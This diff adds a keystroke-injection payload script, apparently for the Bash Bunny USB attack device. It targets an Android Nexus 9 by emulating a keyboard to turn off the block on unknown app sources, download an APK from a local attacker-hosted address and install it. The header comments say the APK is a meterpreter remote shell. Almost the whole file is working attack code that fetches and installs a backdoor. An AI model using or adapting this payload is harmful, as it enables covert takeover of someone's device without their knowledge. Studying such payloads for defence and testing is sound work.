@@ -1,0 +1,104 @@
+#!/bin/bash
+#
+# Title:             Android web download/install meterpreter shell
+# Author:            r1ddl3r
+# Target:            Android 5.1.1 - Nexus 9
+#	props: DemmSec FireTV payload - https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/android/fireytv/payload.txt
+#	props: bg-wa open_url payload - https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/android/open_url/payload.txt
+#	change settings to allow untrusted apps
+#	update url below where you host the apk
+#	larger delays for PoC
+#
+##
+
+ATTACKMODE HID
+
+LED R B 0
+DELAY 500
+Q GUI
+DELAY 500
+Q STRING .
+Q DELAY 200
+Q STRING s
+Q DELAY 200
+Q STRING ettings
+Q DELAY 500
+Q DOWNARROW
+Q DELAY 150
+Q DOWNARROW
+Q DELAY 150
+Q DOWNARROW
+Q DELAY 150
+Q DOWNARROW
+Q DELAY 150
+Q ENTER
+Q DELAY 300
+Q ALT SPACE
+Q DELAY 100
+Q ALT SPACE
+Q DELAY 300
+Q STRING unknown sources
+Q DELAY 200
+Q DOWNARROW
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+Q RIGHTARROW
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+Q GUI b
+Q DELAY 5000
+Q ENTER
+Q DELAY 3000
+Q CTRL t
+Q DELAY 200
+Q CTRL l
+Q DELAY 200
+Q CTRL l
+Q DELAY 200
+Q STRING http://192.168.1.138/bunny.apk
+Q DELAY 100
+Q ENTER
+Q DELAY 1500
+Q CTRL t
+Q DELAY 200
+Q CTRL j
+Q DELAY 200
+Q CTRL j
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+Q DOWNARROW
+Q DELAY 200
+Q DOWNARROW
+Q DELAY 200
+Q DOWNARROW
+Q DELAY 200
+Q DOWNARROW
+Q DELAY 200
+Q DOWNARROW
+Q DELAY 200
+Q RIGHTARROW
+Q DELAY 200
+Q ENTER
+Q DELAY 2000
+Q DOWNARROW
+Q DELAY 200
+Q RIGHTARROW
+Q DELAY 200
+Q ENTER
+Q DELAY 200
+Q ESC
+Q DELAY 100
+Q ESC
+Q DELAY 100
+Q ESC
+Q DELAY 100
+Q ESC
+Q DELAY 100
+Q ESC
+Q DELAY 100
+Q ESC
